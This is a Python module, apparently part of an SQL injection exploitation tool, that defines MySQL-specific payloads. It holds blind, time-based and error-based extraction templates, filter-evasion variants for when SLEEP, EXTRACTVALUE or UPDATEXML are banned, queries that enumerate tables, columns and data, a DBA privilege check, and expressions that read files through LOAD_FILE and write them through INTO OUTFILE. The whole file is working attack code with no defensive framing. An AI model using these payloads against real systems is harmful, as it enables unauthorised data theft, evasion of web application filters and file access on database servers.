# -*- coding: utf-8 -*-
"""MySQL dialect (v1.1: fills in alternative spellings for when keywords are banned)"""
from dbms.base import BaseDialect


class MySQLDialect(BaseDialect):
    name = "mysql"

    def version_expr(self): return "VERSION()"
    def database_expr(self): return "DATABASE()"
    def current_user_expr(self): return "CURRENT_USER()"
    def is_dba_expr(self): return "(SELECT SUPER_PRIV FROM mysql.user WHERE user=CURRENT_USER() LIMIT 0,1)"

    def tables_query(self, db_name, idx):
        if db_name:
            return (f"SELECT table_name FROM information_schema.tables "
                    f"WHERE table_schema='{db_name}' LIMIT {idx},1")
        return (f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=DATABASE() LIMIT {idx},1")

    def columns_query(self, table_name, db_name, idx):
        if db_name:
            return (f"SELECT column_name FROM information_schema.columns "
                    f"WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {idx},1")
        return (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {idx},1")

    def column_types_query(self, table_name, db_name, idx):
        if db_name:
            return (f"SELECT data_type FROM information_schema.columns "
                    f"WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {idx},1")
        return (f"SELECT data_type FROM information_schema.columns "
                f"WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {idx},1")

    def data_query(self, table_name, column, idx):
        return f"SELECT {column} FROM {table_name} LIMIT {idx},1"

    # ---------------- Length / substring / code variants ----------------
    def length_templates(self):
        return ["LENGTH(({sql}))", "CHAR_LENGTH(({sql}))"]

    def substr_templates(self):
        return ["SUBSTR(({sql}),{pos},{len})",
                "MID(({sql}),{pos},{len})",
                "SUBSTRING(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["ASCII(({sql}))", "ORD(({sql}))"]

    # ---------------- Delay: alternatives when sleep is banned ----------------
    def sleep_expr(self, seconds):
        return f"SLEEP({seconds})"

    def sleep_expr_variants(self, seconds):
        return [
            f"SLEEP({seconds})",
            f"(SELECT SLEEP({seconds}))",
            f"BENCHMARK(10000000,MD5(1))",
            f"GET_LOCK(0x61,{seconds})",
            # Full-table Cartesian re-query: depends on no banned function, produces delay via computation volume
            (f"(SELECT COUNT(*) FROM information_schema.columns A,"
             f"information_schema.columns B,information_schema.columns C)"),
            (f"(SELECT COUNT(*) FROM information_schema.columns A,"
             f"information_schema.columns B,information_schema.columns C,"
             f"information_schema.columns D)"),
        ]

    # ---------------- Error: alternatives when extractvalue/updatexml are banned ----------------
    def error_payloads(self, inner):
        return [
            f"EXTRACTVALUE(1,CONCAT(0x7e,{inner},0x7e))",
            f"UPDATEXML(1,CONCAT(0x7e,{inner},0x7e),1)",
            f"(SELECT 1 FROM (SELECT COUNT(*),CONCAT({inner},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            f"GTID_SUBSET(CONCAT(0x7e,{inner},0x7e),1)",
            # Geometry function family: value cannot be converted to geometry -> the content is reflected in the error message
            f"MULTIPOINT({inner})",
            f"POLYGON({inner})",
            f"LINESTRING({inner})",
            f"GEOMETRYCOLLECTION({inner})",
            # exp overflow
            f"EXP(~(SELECT * FROM(SELECT {inner})a))",
            # 5.7+ invalid JSON error
            f"JSON_KEYS({inner})",
            # 5.x constant-expression duplicate column name
            f"(SELECT * FROM (SELECT 1,{inner})x GROUP BY 1 HAVING {inner})",
        ]

    def error_fingerprints(self):
        return [
            "EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))",
            "UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)",
            "(SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),1)",
        ]

    def error_keywords(self):
        return ["XPATH", "MySQL", "MariaDB", "Duplicate entry",
                "Cannot get geometry object", "DOUBLE value is out of range",
                "Invalid JSON"]

    def boolean_fingerprints(self):
        # Keep only the criteria "unique to this DBMS": information_schema errors out directly on other databases.
        # (A `(SELECT 1)=1` used to be attached here too -- it holds on any database, has no
        #   discriminating power, and only makes the first dialect checked in the dictionary always hit.)
        return ["(SELECT COUNT(*) FROM information_schema.tables)>0"]

    def file_read_expr(self, path):
        return f"LOAD_FILE('{path}')"

    def file_write_expr(self, path, content):
        return f"SELECT '{content}' INTO OUTFILE '{path}'"
